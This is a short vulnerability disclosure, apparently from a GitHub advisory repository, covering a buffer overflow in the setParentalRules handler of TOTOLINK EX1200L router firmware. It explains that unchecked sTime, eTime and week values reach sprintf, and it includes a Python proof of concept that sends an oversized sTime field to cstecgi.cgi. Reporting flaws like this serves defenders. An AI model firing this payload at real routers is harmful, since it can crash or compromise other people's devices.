## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/217/ids/36.html

## Affected version

EX1200L_Firmware V9.3.5u.6146_B20201023

## Vulnerability details

In the EX1200L_Firmware V9.3.5u.6146_B20201023 firmware has a buffer overflow vulnerability in the `setParentalRules` function. The `v7, v8, v9` variable receives the `week, sTime, eTime` parameter from a POST request. However, since the user can control the input of `week, sTime, eTime`, the `sprintf` can cause a buffer overflow vulnerability.

![image-20240723210721750](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240723210721750.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
"topicurl":"setParentalRules",
"sTime":"b"*0x1000,
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721012919451](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721012919451.png)
